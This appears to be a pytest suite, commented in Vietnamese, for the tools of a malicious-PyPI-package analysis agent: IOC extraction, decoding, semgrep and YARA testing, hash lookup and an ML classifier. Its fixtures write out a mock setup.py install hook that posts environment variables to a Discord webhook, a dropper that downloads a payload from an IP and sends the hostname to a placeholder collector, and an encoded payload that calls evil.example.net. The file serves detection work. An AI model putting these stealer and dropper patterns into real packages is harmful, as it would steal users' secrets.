"""Test các tool trong allowlist. Mẫu "độc" ở đây là mã giả do test tự dựng (không chạy được
gì nguy hiểm, URL/IP là giá trị giả). Không gọi mạng: HTTP được thay bằng hàm giả.
"""

from __future__ import annotations

import base64
import io
import json
import shutil
import tarfile
import zlib
from pathlib import Path

import pytest

from agent.react_loop import ReactAgent
from tools import decode_string, hash_lookup, read_file, semgrep_tool, typosquat
from tools.common import extract_iocs

# ---------------- mẫu giả ----------------

STEALER_SETUP = '''import os, requests
from setuptools import setup
from setuptools.command.install import install

class Hook(install):
    def run(self):
        data = {{"env": dict(os.environ), "v": "{variant}"}}
        requests.post("https://discord.com/api/webhooks/123456789012/{token}", json=data)
        install.run(self)

setup(name="{name}", version="0.1", cmdclass={{"install": Hook}})
'''

BENIGN_SETUP = '''import os
from setuptools import setup

here = os.path.abspath(os.path.dirname(__file__))
with open(os.path.join(here, "README.md")) as f:
    long_description = f.read()

setup(name="{name}", version="1.0", url="https://github.com/example/{name}",
      long_description=long_description, install_requires=["requests"])
'''

BENIGN_CLIENT = '''import os
import requests

API = os.environ.get("EXAMPLE_API", "https://api.example.org")

def fetch(item: str) -> dict:
    """Lấy dữ liệu công khai."""
    return requests.get(f"{{API}}/items/{{item}}", timeout=10).json()
'''


def write_pkg(d: Path, files: dict[str, str]) -> Path:
    for rel, text in files.items():
        p = d / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text, encoding="utf-8")
    return d


def tar_dir(src: Path, dest: Path) -> Path:
    with tarfile.open(dest, "w:gz") as tf:
        for p in sorted(src.rglob("*")):
            if p.is_file():
                tf.add(p, arcname=p.relative_to(src.parent).as_posix())
    return dest


@pytest.fixture
def dataset(tmp_path: Path) -> dict[str, Path]:
    """3 biến thể stealer (archive .tar.gz) + 3 gói sạch + ground_truth."""
    mal, ben, gt, work = (tmp_path / x for x in ("malicious", "benign", "ground_truth", "work"))
    for x in (mal, ben, gt, work):
        x.mkdir()
    for i in range(3):
        name = f"evil-pkg{i}"
        src = write_pkg(work / f"{name}-0.1", {
            "setup.py": STEALER_SETUP.format(name=name, variant=i, token=f"tok{i}" + "A" * 30),
            f"{name.replace('-', '_')}/__init__.py": f"VERSION = '{i}'\n",
        })
        tar_dir(src, mal / f"{name}-0.1.tar.gz")
        (gt / f"{name}-0.1.json").write_text(json.dumps(
            {"verdict": {"label": "malicious"}, "family": {"name": "discord-env-stealer", "behavior_type": "stealer"}}))
    for i in range(3):
        name = f"good-lib{i}"
        src = write_pkg(work / f"{name}-1.0", {
            "setup.py": BENIGN_SETUP.format(name=name),
            "README.md": "# good\n",
            f"{name.replace('-', '_')}/client.py": BENIGN_CLIENT,
        })
        tar_dir(src, ben / f"{name}-1.0.tar.gz")
    return {"malicious": mal, "benign": ben, "ground_truth": gt, "work": work, "tmp": tmp_path}


# ---------------- IOC ----------------

def test_extract_iocs():
    text = (
        'requests.post("https://discord.com/api/webhooks/123456789012/abcdefghijklmnopqrstuvwxyz012345")\n'
        'u = "https://api.telegram.org/bot1234567890:AAEabcdefghijklmnopqrstuvwxyz0123456/sendMessage"\n'
        's.connect(("45.33.32.156", 4444)); local = "127.0.0.1"\n'
        'key = "AKIAABCDEFGHIJKLMNOP"; p = os.path.expanduser("~/.ssh/id_rsa")\n'
        'home = "https://github.com/x/y"\n'
    )
    iocs = extract_iocs(text)
    by = {(i["type"], i["value"]) for i in iocs}
    assert ("webhook", "https://discord.com/api/webhooks/123456789012/abcdefghijklmnopqrstuvwxyz012345") in by
    assert any(t == "webhook" and "api.telegram.org/bot" in v for t, v in by)
    assert any(i["type"] == "token" and i.get("token_kind") == "telegram_bot_token" for i in iocs)
    assert ("ip", "45.33.32.156") in by and ("ip", "127.0.0.1") not in by
    assert ("token", "AKIAABCDEFGHIJKLMNOP") in by
    assert any(i["type"] == "path" and "id_rsa" in i["value"] for i in iocs)
    gh = [i for i in iocs if i["type"] == "domain" and i["value"] == "github.com"]
    assert gh and gh[0].get("common")
    assert next(i for i in iocs if i["value"] == "45.33.32.156")["line"] == 3


# ---------------- read_file ----------------

def test_read_file(tmp_path):
    f = tmp_path / "a.py"
    f.write_text("\n".join([f"x{i} = {i}" for i in range(1, 300)] + ['u = "http://203.0.113.9/p"']))
    out = read_file.run({"path": str(f), "start_line": 5, "max_lines": 3})
    assert out["range"] == [5, 7] and out["content"].splitlines()[0] == "5: x5 = 5" and out["has_more"]
    out = read_file.run({"path": str(f), "start_line": 290, "max_lines": 9999})
    assert out["range"][1] == 300
    assert any(i["value"] == "203.0.113.9" and i["line"] == 300 for i in out["iocs_in_view"])
    assert len(read_file.run({"path": str(f), "max_lines": 9999})["content"].splitlines()) == 200
    (tmp_path / "b.bin").write_bytes(b"\x00\x01\x02" * 100)
    assert "nhị phân" in read_file.run({"path": str(tmp_path / "b.bin")})["error"]
    assert "error" in read_file.run({"path": str(tmp_path)})


# ---------------- decode_string ----------------

def test_decode_auto_multilayer_never_executes(tmp_path):
    marker = tmp_path / "PWNED"
    payload = f"import os\nopen({str(marker)!r}, 'w').write('x')\nrequests.post('https://evil.example.net/c')\n"
    blob = base64.b64encode(zlib.compress(payload.encode())).decode()
    out = decode_string.run({"data": blob})
    assert out["applied"] == ["base64", "zlib"]
    assert out["result"]["kind"] == "text" and "evil.example.net" in out["result"]["text"]
    assert out["looks_like_code"] is True
    assert any(i["type"] == "domain" and i["value"] == "evil.example.net" for i in out["iocs"])
    assert not marker.exists()


def test_decode_explicit_methods():
    assert decode_string.run({"data": "68656c6c6f", "methods": ["hex"]})["result"]["text"] == "hello"
    assert decode_string.run({"data": "uryyb", "methods": "rot13"})["result"]["text"] == "hello"
    rev = base64.b64encode(b"print('hi there')").decode()[::-1]
    assert decode_string.run({"data": rev, "methods": "reverse,base64"})["result"]["text"] == "print('hi there')"
    assert "error" in decode_string.run({"data": "!!!", "methods": ["base64"]})
    assert "error" in decode_string.run({"data": "x", "methods": ["pickle"]})


def test_decode_garbage_and_bomb():
    out = decode_string.run({"data": "hello world this is plain"})
    assert out["applied"] == [] and "note" in out
    bomb = base64.b64encode(zlib.compress(b"\0" * (8 * 1024 * 1024))).decode()
    out = decode_string.run({"data": bomb, "methods": ["base64", "zlib"]})
    assert "error" in out and "5 MB" in out["error"]


# ---------------- check_typosquat ----------------

@pytest.mark.parametrize("name,target", [
    ("reqeusts", "requests"),
    ("requestss", "requests"),
    ("python-requests", "requests"),
    ("djang0", "django"),
    ("Py_Yaml", "pyyaml"),
    ("colourama", "colorama"),
])
def test_typosquat_hits(name, target):
    out = typosquat.run({"name": name})
    assert out["typosquat_suspected"], out
    assert target in [t["target"] for t in out["suspected_targets"]]


def test_typosquat_clean():
    assert typosquat.run({"name": "requests"})["is_popular_package"] is True
    assert typosquat.run({"name": "zqxv-unique-internal-tool"})["typosquat_suspected"] is False
    assert typosquat.levenshtein("abcd", "abdc") == 1


# ---------------- semgrep_scan ----------------

def test_semgrep_summarize(tmp_path):
    raw = {"results": [
        {"check_id": "rules.semgrep.cmp198-env-exfil", "path": str(tmp_path / "p" / "setup.py"),
         "start": {"line": 8}, "extra": {"severity": "ERROR", "message": "env", "lines": "requests.post(x)",
                                         "metadata": {"attack": ["T1041"], "behavior": "stealer"}}},
        {"check_id": "rules.semgrep.cmp198-setup-shell", "path": str(tmp_path / "p" / "setup.py"),
         "start": {"line": 3}, "extra": {"severity": "WARNING", "message": "sh", "lines": "os.system(x)"}},
    ], "errors": []}
    s = semgrep_tool.summarize(raw, tmp_path)
    assert s["total_findings"] == 2
    assert s["rules"][0]["rule"] == "cmp198-env-exfil" and s["rules"][0]["behavior"] == "stealer"
    assert s["rules"][0]["findings"][0] == {"file": "p/setup.py", "line": 8, "code": "requests.post(x)"}


def test_semgrep_missing_binary(tmp_path, monkeypatch):
    monkeypatch.setattr(semgrep_tool.shutil, "which", lambda _: None)
    assert "error" in semgrep_tool.run({"path": str(tmp_path)})


EXEC_B64 = '''import base64, zlib
exec(base64.b64decode("cHJpbnQoMSk="))
code = zlib.decompress(b"...")
exec(code)
'''
DROPPER = '''import requests, subprocess, socket, platform
r = requests.get("http://198.51.100.7/payload.bin")
open("/tmp/p.bin", "wb").write(r.content)
info = socket.gethostname()
requests.get("https://collector.example.net/?h=" + info)
'''


@pytest.mark.skipif(shutil.which("semgrep") is None, reason="semgrep chưa cài")
def test_semgrep_rules_real(dataset, tmp_path):
    with tarfile.open(next(dataset["malicious"].iterdir())) as tf:
        tf.extractall(tmp_path / "mal", filter="data")
    write_pkg(tmp_path / "mal", {"extra/exec_b64.py": EXEC_B64, "extra/dropper.py": DROPPER})
    out = semgrep_tool.run({"path": str(tmp_path / "mal")})
    assert "error" not in out, out
    hit = {r["rule"] for r in out["rules"]}
    for rid in ("cmp198-install-hook-network", "cmp198-env-exfil", "cmp198-webhook-url",
                "cmp198-exec-decoded", "cmp198-download-exec", "cmp198-host-info-exfil"):
        assert rid in hit, (rid, hit, out.get("errors"))

    with tarfile.open(next(dataset["benign"].iterdir())) as tf:
        tf.extractall(tmp_path / "ben", filter="data")
    out = semgrep_tool.run({"path": str(tmp_path / "ben")})
    assert "error" not in out, out
    assert [r for r in out["rules"] if r["severity"] == "ERROR"] == [], out


# ---------------- hash_lookup ----------------

class FakeResp:
    def __init__(self, status: int, body: dict) -> None:
        self.status_code, self._b = status, body

    def json(self) -> dict:
        return self._b


@pytest.fixture
def http_log(monkeypatch):
    calls: list[tuple[str, str, dict]] = []

    def fake(method, url, **kw):
        calls.append((method, url, kw))
        if "virustotal" in url:
            return FakeResp(200, {"data": {"attributes": {
                "last_analysis_stats": {"malicious": 7, "undetected": 50},
                "last_analysis_results": {"A": {"category": "malicious", "result": "Python.Stealer.X"},
                                          "B": {"category": "undetected", "result": None}},
                "popular_threat_classification": {"suggested_threat_label": "trojan.pystealer",
                                                  "popular_threat_category": [{"value": "trojan"}]},
                "first_submission_date": 1700000000}}})
        if "abuse.ch" in url:
            return FakeResp(200, {"query_status": "hash_not_found"})
        if "osv.dev" in url:
            return FakeResp(200, {"vulns": [{"id": "MAL-2024-1234", "summary": "Malicious code in evil-pkg0"}]})
        return FakeResp(500, {})

    monkeypatch.setattr(hash_lookup, "_http", fake)
    return calls


def test_hash_lookup(tmp_path, http_log, monkeypatch):
    monkeypatch.setenv("VT_API_KEY", "test-key")
    monkeypatch.setenv("MALWAREBAZAAR_API_KEY", "test-key")
    root = write_pkg(tmp_path / "pkg", {"setup.py": "from setuptools import setup\nsetup(name='evil-pkg0')\n"})
    sha = "a" * 64
    args = {"path": str(root), "_package_sha256": sha, "_cache_dir": str(tmp_path / "cache"),
            "name": "evil-pkg0", "version": "0.1", "_sleep": lambda s: None}
    out = hash_lookup.run(dict(args))
    vt = out["lookups"]["package"]["virustotal"]
    assert vt["malicious"] == 7 and vt["engine_labels"] == ["Python.Stealer.X"]
    assert vt["suggested_label"] == "trojan.pystealer" and vt["first_submission"] == "2023-11-14"
    assert out["lookups"]["package"]["malwarebazaar"] == {"found": False, "queried_at": vt["queried_at"]} or \
        out["lookups"]["package"]["malwarebazaar"]["found"] is False
    assert out["osv"]["known_malicious"] and out["osv"]["malicious_ids"] == ["MAL-2024-1234"]
    assert out["files"][0]["file"] == "setup.py" and len(out["files"][0]["sha256"]) == 64

    # chỉ gửi hash / tên gói: VT dùng GET với URL chứa đúng hash, không có body file
    vt_calls = [c for c in http_log if "virustotal" in c[1]]
    assert vt_calls == [("GET", f"https://www.virustotal.com/api/v3/files/{sha}", vt_calls[0][2])]
    assert "files" not in vt_calls[0][2] and "data" not in vt_calls[0][2]
    mb = next(c for c in http_log if "abuse.ch" in c[1])
    assert mb[2]["data"] == {"query": "get_info", "hash": sha}

    # lần 2: lấy từ cache, không gọi mạng
    n = len(http_log)
    out2 = hash_lookup.run(dict(args))
    assert len(http_log) == n and out2["lookups"]["package"]["virustotal"]["cached"] is True


def test_hash_lookup_no_keys_and_offline(tmp_path, http_log, monkeypatch):
    monkeypatch.delenv("VT_API_KEY", raising=False)
    monkeypatch.delenv("MALWAREBAZAAR_API_KEY", raising=False)
    out = hash_lookup.run({"path": str(tmp_path), "_package_sha256": "b" * 64, "_cache_dir": str(tmp_path / "c"),
                           "name": "x", "_offline": True})
    assert "skipped" in out["lookups"]["package"]["virustotal"]
    assert out["osv"].get("skipped") == "chế độ offline"
    assert http_log == []
    assert "error" in hash_lookup.vt_lookup("not-a-hash", "k", None)  # type: ignore[arg-type]


def test_rate_limiter(tmp_path):
    t = [1000.0]
    slept: list[float] = []

    def sleep(s):
        slept.append(s)
        t[0] += s

    rl = hash_lookup.RateLimiter(tmp_path / "rate.json", 4, sleep=sleep, clock=lambda: t[0])
    for _ in range(4):
        assert rl.acquire()
    assert slept == []
    assert rl.acquire() and slept and 59 <= slept[0] <= 61
    rl2 = hash_lookup.RateLimiter(tmp_path / "rate.json", 4, max_wait_s=1, sleep=sleep, clock=lambda: t[0])
    for _ in range(3):
        rl2.acquire()
    assert rl2.acquire() is False  # phải chờ quá lâu -> từ chối thay vì treo


# ---------------- fuzzy_similarity ----------------

def test_fuzzy(dataset, tmp_path):
    pytest.importorskip("ppdeep")
    from tools import fuzzy
    idx = tmp_path / "index.json"
    n = fuzzy.build_index(dataset["malicious"], dataset["ground_truth"], idx)
    assert n >= 3
    probe = write_pkg(tmp_path / "probe", {
        "setup.py": STEALER_SETUP.format(name="evil-new", variant=9, token="tokZ" + "B" * 30)})
    out = fuzzy.run({"path": str(probe), "_index": str(idx)})
    assert out["matches"], out
    assert out["families_matched"] == ["discord-env-stealer"]
    clean = write_pkg(tmp_path / "clean", {"setup.py": BENIGN_SETUP.format(name="zzz") * 3})
    fams = fuzzy.run({"path": str(clean), "_index": str(idx)}).get("families_matched", [])
    assert "discord-env-stealer" not in fams

    # loại trừ chính gói đang phân tích
    entries = json.loads(idx.read_text())["entries"]
    pkg_sha = entries[0]["package_sha256"]
    self_root = tmp_path / "self"
    with tarfile.open(sorted(dataset["malicious"].iterdir())[0]) as tf:
        tf.extractall(self_root, filter="data")
    out = fuzzy.run({"path": str(self_root), "_index": str(idx), "_package_sha256": pkg_sha})
    assert all(m["match_sample"] != entries[0]["sample"] for m in out["matches"])


# ---------------- ml_classify ----------------

def test_ml_train_and_classify(dataset, tmp_path):
    pytest.importorskip("sklearn")
    from ml.train import train
    from tools import ml_classify
    data = tmp_path / "mldata"
    shutil.copytree(dataset["malicious"], data / "malicious")
    shutil.copytree(dataset["benign"], data / "benign")
    shutil.copytree(dataset["ground_truth"], data / "ground_truth")
    model = tmp_path / "model.joblib"
    bundle = train(data, model, cv=3)
    assert bundle["label_counts"] == {"benign": 3, "stealer": 3}

    probe = write_pkg(tmp_path / "probe", {
        "setup.py": STEALER_SETUP.format(name="evil-new", variant=9, token="tokZ" + "B" * 30)})
    out = ml_classify.run({"path": str(probe), "_model_path": str(model)})
    assert out["prediction"] == "stealer", out
    assert out["important_tokens_present"]
    assert "chưa có mô hình" in ml_classify.run({"path": str(probe), "_model_path": str(tmp_path / "none")})["error"]


# ---------------- yara_generate_test ----------------

GOOD_RULE = r'''
rule CMP198_PyPI_discord_env_stealer {
  meta:
    description = "cmdclass install gửi os.environ tới webhook Discord"
    author = "agent"
    date = "2026-11-23"
    hash = "test"
  strings:
    $hook = "cmdclass" ascii
    $env = "os.environ" ascii
    $post = "requests.post(" ascii
    $wh = "discord.com/api/webhooks/" ascii
  condition:
    $hook and $env and $post and $wh
}
'''


def yara_args(dataset, **kw):
    return {"_malicious_dir": str(dataset["malicious"]), "_benign_dir": str(dataset["benign"]),
            "_ground_truth": str(dataset["ground_truth"]), **kw}


def test_yara_good_rule(dataset):
    pytest.importorskip("yara")
    from tools import yara_tool
    out = yara_tool.run(yara_args(dataset, rule=GOOD_RULE, family="stealer"))
    assert out["tpr"] == 1.0 and out["fpr"] == 0.0 and out["meets_target"], out
    assert out["malicious"]["total"] == 3 and out["lint_warnings"] == []


def test_yara_bad_rules(dataset):
    pytest.importorskip("yara")
    from tools import yara_tool
    out = yara_tool.run(yara_args(dataset, rule='rule x { strings: $a = "requests" condition: $a }'))
    assert out["fpr"] == 1.0 and not out["meets_target"]
    assert any("CMP198_PyPI_" in w for w in out["lint_warnings"]) and any("meta" in w for w in out["lint_warnings"])
    assert "cú pháp" in yara_tool.run(yara_args(dataset, rule="rule broken { condition: $nope }"))["error"]
    assert "include" in yara_tool.run(yara_args(dataset, rule='include "/etc/passwd"\nrule a { condition: true }'))["error"]
    ioc_only = 'rule CMP198_PyPI_x { meta: description="d" author="agent" date="x" hash="h" ' \
               'strings: $u = "https://discord.com/api/webhooks/123456789012/" condition: $u }'
    assert any("chỉ dựa vào IOC" in w for w in yara_tool.run(yara_args(dataset, rule=ioc_only))["lint_warnings"])


def test_finalize_takes_best_tested_yara():
    runs = [{"rule": "r1", "tpr": 1.0, "fpr": 0.33, "meets_target": False},
            {"rule": "r2", "tpr": 1.0, "fpr": 0.0, "meets_target": True},
            {"rule": "r3", "tpr": 0.5, "fpr": 0.0, "meets_target": False}]
    r = ReactAgent.finalize({"yara_rule": "r-untested"}, set(), {}, runs)
    assert r["yara_rule"] == "r2" and r["yara_test"] == {"tpr": 1.0, "fpr": 0.0}
    assert any("khác luật đã kiểm tra" in u for u in r["unknowns"])
    r = ReactAgent.finalize({"yara_rule": "rule x {}"}, set(), {}, [])
    assert r["yara_rule"] == "" and any("chưa được kiểm tra" in u for u in r["unknowns"])


# ---------------- samples ----------------

def test_open_sample_nested_archive(tmp_path):
    from tools.samples import open_sample, sample_id
    inner = io.BytesIO()
    with tarfile.open(fileobj=inner, mode="w:gz") as tf:
        data = b"print(1)\n"
        ti = tarfile.TarInfo("p-1.0/setup.py")
        ti.size = len(data)
        tf.addfile(ti, io.BytesIO(data))
    import zipfile
    outer = tmp_path / "p-1.0.zip"
    with zipfile.ZipFile(outer, "w") as zf:
        zf.writestr("p-1.0.tar.gz", inner.getvalue())
    with open_sample(outer) as root:
        assert (root / "p-1.0" / "setup.py").read_text() == "print(1)\n"
    assert sample_id(outer) == "p-1.0"
